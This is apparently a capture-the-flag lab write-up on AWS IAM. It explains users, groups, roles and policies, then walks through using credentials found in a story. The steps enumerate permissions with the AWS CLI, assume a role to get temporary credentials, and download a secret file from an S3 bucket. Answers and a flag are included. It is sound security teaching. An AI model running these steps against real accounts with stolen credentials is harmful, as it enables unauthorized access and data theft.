# **AWS Security – S3cret Santa**

# **Task 1 – Introduction**

## **The Story**

One of our stealthiest infiltrated elves managed to hop their way into **Sir Carrotbane's office** and, lo and behold, discovered a bundle of **cloud credentials** just lying around on his desktop like forgotten carrots.

The agent suspects these could be the key to regaining access to **TBFC's cloud network**. If only the poor hare had the faintest clue what "the cloud" is, he'd burrow in himself.

**Let's help the elf utilise these credentials to try to regain access to TBFC's cloud network.**

---

## **Learning Objectives**

- Learn the basics of AWS accounts
- Enumerate the privileges granted to an account, from an attacker's perspective
- Familiarise yourself with the AWS CLI

---

# **Task 2 – IAM: Users, Roles, Groups and Policies**

## **IAM Overview**

**Amazon Web Services** utilises the **Identity and Access Management (IAM)** service to manage users and their access to various resources, including the actions that can be performed against those resources.

Therefore, it is crucial to ensure that the correct access is assigned to each user according to the requirements. **Misconfiguring IAM** has led to several high-profile security incidents in the past, giving attackers access to resources they were not supposed to access.

**Companies affected:**

- **Toyota**
- **Accenture**
- **Verizon**

These attacks often exposed customer data or sensitive documents. Below, we will discuss the different aspects of IAM that can lead to sensitive data exposure if misconfigured.

---

## **IAM Users**

A **user** represents a single identity in AWS. Each user has a set of credentials, such as passwords or access keys, that can be used to access resources. Furthermore, **permissions can be granted at a user level**, defining the level of access a user might have.

**Example:** Sir Carrotbane as a user in AWS

---

## **IAM Groups**

Multiple users can be combined into a **group**. This can be done to ease the access management for multiple users.

**Example:** In an organisation employing hundreds of thousands of people, there might be a handful of people who need write access to a certain database. Instead of granting access to each user individually, the admin can:

1. Grant access to a group
2. Add all users who require write access to that group
3. When a user no longer needs access, they can be removed from the group

**Example:** Sir Carrotbane's army as a group

---

## **IAM Roles**

An **IAM Role** is a temporary identity that can be assumed by a user, as well as by services or external accounts, to get certain permissions.

**Analogy:** Think of Sir Carrotbane, and how, depending on the battle ahead, he might need to assume the role of an **attacker** or a **defender**:

- **Attacker role** → Permission to wield his shiny swords
- **Defender role** → Permission to carry a shield to better defend King Malhare

**Example:** Carrotbane assuming roles

---

## **IAM Policies**

Access provided to any user, group or role is controlled through **IAM policies**. A policy is a **JSON document** that defines the following:

| Component     | Description            |
| ------------- | ---------------------- |
| **Action**    | What action is allowed |
| **Resource**  | On which resources     |
| **Condition** | Under which conditions |
| **Principal** | For whom               |

---

### **Example Policy**

Consider the following hypothetical policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowSpecificUserReadAccess",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:user/Alice"
      },
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::my-private-bucket/*"
    }
  ]
}
```

**This policy grants:**

- **Principal:** AWS user Alice
- **Action:** Get an object from an S3 bucket
- **Resource:** S3 bucket named `my-private-bucket`

---

## **Questions**

### **What IAM component is used to describe the permissions to be assigned to a user or a group?**

<details>
  <summary>Click to reveal the answer</summary>

**policy**

</details>

---# **Task 3 – Practical: Enumerating a User's Permissions**

## **Enumerating Users**

Alright, let's see what we can do with the credentials we got from Sir Carrotbane's office, since we have already configured them in our environment. We can start interacting with the **AWS CLI** to find more information.

Let's begin by enumerating users. We can do so by running the following command in the terminal:

```bash
aws iam list-users
```

We will see an output that lists all the users, as well as some other useful information such as their creation date.

---

## **Enumerating User Policies**

**Policies can be inline or attached:**

| Policy Type           | Description                                                                                                                              |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **Inline Policies**   | Assigned directly in the user (or group/role) profile and will be deleted if the identity is deleted (hard-coded policies)               |
| **Attached Policies** | Also called **managed policies**, can be considered reusable. One change in the policy affects every identity that policy is attached to |

---

### **Step 1: List Inline Policies**

Let's see what inline policies are assigned to Sir Carrotbane:

```bash
aws iam list-user-policies --user-name sir.carrotbane
```

Great! We can see an inline policy in the results. Let's take note of its name for later.

---

### **Step 2: List Attached Policies**

Maybe Sir Carrotbane has some policies attached to their account:

```bash
aws iam list-attached-user-policies --user-name sir.carrotbane
```

Hmmm, not much here.

---

### **Step 3: Check Group Membership**

Perhaps we can check if Sir Carrotbane is part of a group:

```bash
aws iam list-groups-for-user --user-name sir.carrotbane
```

Looks like `sir.carrotbane` is not a part of any group.

---

### **Step 4: Get Inline Policy Details**

Let's get back to the inline policy we found for Sir Carrotbane's account. Let's see what permissions this policy grants by running the following command (replace `POLICYNAME` with the actual policy name you found):

```bash
aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane
```

**Output:**

```json
{
  "UserName": "sir.carrotbane",
  "PolicyName": "POLICYNAME",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": [
          "iam:ListUsers",
          "iam:ListGroups",
          "iam:ListRoles",
          "iam:ListAttachedUserPolicies",
          "iam:ListAttachedGroupPolicies",
          "iam:ListAttachedRolePolicies",
          "iam:GetUserPolicy",
          "iam:GetGroupPolicy",
          "iam:GetRolePolicy",
          "iam:GetUser",
          "iam:GetGroup",
          "iam:GetRole",
          "iam:ListGroupsForUser",
          "iam:ListUserPolicies",
          "iam:ListGroupPolicies",
          "iam:ListRolePolicies",
          "sts:AssumeRole"
        ],
        "Effect": "Allow",
        "Resource": "*",
        "Sid": "ListIAMEntities"
      }
    ]
  }
}
```

---

## **Analysis**

So, it looks like Sir Carrotbane has access to enumerate all the different kinds of users, groups, roles and policies (IAM entities), but that is about it. That is not a lot of help getting TBFC's access back.

**We might need to try something different to do that.**

**Key Finding:** If you look carefully, you'll notice `sir.carrotbane` can perform the `sts:AssumeRole` action. **Maybe there's still hope!**

---

## **Questions**

### **What is the name of the policy assigned to sir.carrotbane?**

<details>
  <summary>Click to reveal the answer</summary>

**SirCarrotbanePolicy**

</details>

---

# **Task 4 – Assuming Roles**

## **Enumerating Roles**

The `sts:AssumeRole` action we previously found allows `sir.carrotbane` to assume roles. Perhaps we can try to see if there's any interesting ones available.

Let's start by listing the existing roles in the account:

```bash
aws iam list-roles
```

**Output:**

```json
{
  "Roles": [
    {
      "Path": "/",
      "RoleName": "bucketmaster",
      "RoleId": "AROARZPUZDIKJJZ6OWN27",
      "Arn": "arn:aws:iam::123456789012:role/bucketmaster",
      "CreateDate": "2025-11-26T01:54:01.342203+00:00",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::123456789012:user/sir.carrotbane"
            }
          }
        ],
        "Version": "2012-10-17"
      },
      "MaxSessionDuration": 3600
    }
  ]
}
```

**Bingo!** There's a role named `bucketmaster`, and it can be assumed by `sir.carrotbane`.

---

## **Enumerating Role Policies**

Let's find out what policies are assigned to this role. Just as users, roles can have **inline policies** and **attached policies**.

### **Step 1: Check Inline Policies**

```bash
aws iam list-role-policies --role-name bucketmaster
```

There is one policy assigned to this role.

---

### **Step 2: Check Attached Policies**

Before checking that policy, let's see if there are any attached policies assigned to the role as well:

```bash
aws iam list-attached-role-policies --role-name bucketmaster
```

Looks like we only have the inline policy assigned.

---

### **Step 3: Get Role Policy Details**

Let's see what permissions we can get from the policy:

```bash
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

**Output:**

````json

{
    "RoleName": "bucketmaster",
    "PolicyName": "BucketMasterPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "s3:ListAllMyBuckets"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListAllBuckets"
            },
            {
                "Action": [
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::easter-secrets-123145",
                    "arn:aws:s3:::bunny-website-645341"
                ],
                "Sid": "ListBuckets"
            },
            {
                "Action": [
                    "s3:GetObject"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:s3:::easter-secrets-123145/*",
                "Sid": "GetObjectsFromEasterSecrets"
            }
        ]
    }
}
Well, what do we have here? We can see that the bucketmaster role can perform three different actions (ListAllBuckets, ListBucket and GetObject) on some resources of a service named S3. This might just be the breakthrough we were looking for. More on this service later.

Assuming Role
To gain privileges assigned by the bucketmaster role, we need to assume it. We can use AWS STS to obtain the temporary credentials that enable us to assume this role.

aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC

This command will ask STS, the service in charge of AWS security tokens, to generate a temporary set of credentials to assume the bucketmaster role. The temporary credentials will be referenced by the session-name "TBFC" (you can set any name you want for the session). Let's run the command:

```json
{
    "Credentials": {
        "AccessKeyId": "ASIA[REDACTED]",
        "SecretAccessKey": "[REDACTED]",
        "SessionToken": "[REDACTED]",
        "Expiration": "2025-11-26T03:40:11.117460+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKJJZ6OWN27:TBFC",
        "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6
}
````

---

### **Step 2: Set Temporary Credentials**

The output will provide us the credentials we need to assume this role, specifically the `AccessKeyID`, `SecretAccessKey` and `SessionToken`.

To be able to use these, run the following commands in the terminal, replacing with the exact credentials that you received on running the `assume-role` command:

```bash
export AWS_ACCESS_KEY_ID="ASIAxxxxxxxxxxxx"
export AWS_SECRET_ACCESS_KEY="abcd1234xxxxxxxxxxxx"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEJr..."
```

---

### **Step 3: Verify Role Assumption**

Once we have done that, we can officially use the permissions granted by the `bucketmaster` role. To check if you have correctly assumed the role, you can once again run:

```bash
aws sts get-caller-identity
```

This time, it should show you are now using the `bucketmaster` role.

---

## **Questions**

### **Apart from GetObject and ListBucket, what other action can be taken by assuming the bucketmaster role?**

<details>
  <summary>Click to reveal the answer</summary>

**ListAllMyBuckets**

</details>

---

# **Task 5 – Grabbing a File from S3**

## **What Is S3?**

Before we continue, we need to know what exactly is S3.

**Amazon S3** stands for **Simple Storage Service**. It is an object storage service provided by Amazon Web Services that can store any type of object such as:

- Images
- Documents
- Logs
- Backup files

**Use Cases:**

Companies often use S3 to store data for various reasons, such as:

- Reference images for their website
- Documents to be shared with clients
- Files used by internal services for internal processing

**Concept:** Any object you store in S3 will be put into a **"Bucket"**. You can think of a bucket as a directory where you can store files, but in the cloud.

---

## **Accessing Sir Carrotbane's S3 Bucket**

Now, let's see what our newly gained access to Sir Carrotbane's S3 bucket provides us.

---

### **Step 1: List All Buckets**

Since our profile has permission to `ListAllBuckets`, we can list the available S3 buckets by running the following command:

```bash
aws s3api list-buckets
```

There is one interesting bucket in there that references `easter`.

---

### **Step 2: List Objects in a Bucket**

Let's check out the contents of this directory:

```bash
aws s3api list-objects --bucket easter-secrets-123145
```

---

### **Step 3: Download a File**

Hmmm, let's copy the file in this directory to our local machine. This might have a secret message:

```bash
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
```

**Hooray!** We have successfully infiltrated Sir Carrotbane's S3 bucket and exfiltrated some sensitive data.

---

## **Questions**

### **What are the contents of the cloud_password.txt file?**

<details>
  <summary>Click to reveal the answer</summary>

**THM{more_like_sir_cloudbane}**

</details>

---
